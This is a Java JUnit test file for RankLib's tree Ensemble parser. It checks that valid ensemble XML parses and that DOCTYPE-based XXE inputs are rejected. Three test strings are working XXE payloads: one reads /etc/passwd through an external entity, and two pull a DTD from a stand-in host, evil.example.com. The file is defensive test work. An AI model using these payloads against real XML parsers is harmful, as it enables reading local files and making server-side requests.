package ciir.umass.edu.learning.tree;

import ciir.umass.edu.utilities.RankLibError;
import org.junit.Test;

import static org.junit.Assert.*;

public class EnsembleTest {

    // Minimal valid ensemble XML — compact (no whitespace text nodes between elements)
    // because Ensemble.create() navigates via getFirstChild() and doesn't skip text nodes.
    private static final String VALID_ENSEMBLE =
            "<ensemble>" +
            "<tree id=\"1\" weight=\"0.1\">" +
            "<split>" +
            "<feature> 1 </feature>" +
            "<threshold> 0.5 </threshold>" +
            "<split pos=\"left\"><output> -1.0 </output></split>" +
            "<split pos=\"right\"><output> 1.0 </output></split>" +
            "</split>" +
            "</tree>" +
            "</ensemble>";

    @Test
    public void testValidXmlParsesSuccessfully() {
        Ensemble ensemble = new Ensemble(VALID_ENSEMBLE);
        assertEquals(1, ensemble.treeCount());
        assertNotNull(ensemble.getFeatures());
    }

    @Test
    public void testDocTypeDeclBlocked() {
        // DOCTYPE declarations are disallowed entirely to prevent all XXE variants
        String xxePayload =
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n" +
                "<ensemble>\n" +
                " <tree id=\"1\" weight=\"1.0\">\n" +
                "  <split><output> 0.5 </output></split>\n" +
                " </tree>\n" +
                "</ensemble>";

        try {
            new Ensemble(xxePayload);
            fail("Expected RankLibError for DOCTYPE declaration");
        } catch (RankLibError e) {
            // expected — disallow-doctype-decl fires before the entity is resolved
        }
    }

    @Test
    public void testExternalDtdReferenceBlocked() {
        // DOCTYPE with external DTD URI should be rejected
        String xxePayload =
                "<!DOCTYPE ensemble SYSTEM \"http://evil.example.com/evil.dtd\">\n" +
                VALID_ENSEMBLE;

        try {
            new Ensemble(xxePayload);
            fail("Expected RankLibError for external DTD reference");
        } catch (RankLibError e) {
            // expected
        }
    }

    @Test
    public void testExternalParameterEntityBlocked() {
        // External parameter entities are another XXE vector
        String xxePayload =
                "<!DOCTYPE foo [\n" +
                "  <!ENTITY % remote SYSTEM \"http://evil.example.com/evil.dtd\">\n" +
                "  %remote;\n" +
                "]>\n" +
                "<ensemble>\n" +
                " <tree id=\"1\" weight=\"1.0\">\n" +
                "  <split><output> 0.5 </output></split>\n" +
                " </tree>\n" +
                "</ensemble>";

        try {
            new Ensemble(xxePayload);
            fail("Expected RankLibError for external parameter entity");
        } catch (RankLibError e) {
            // expected
        }
    }
}
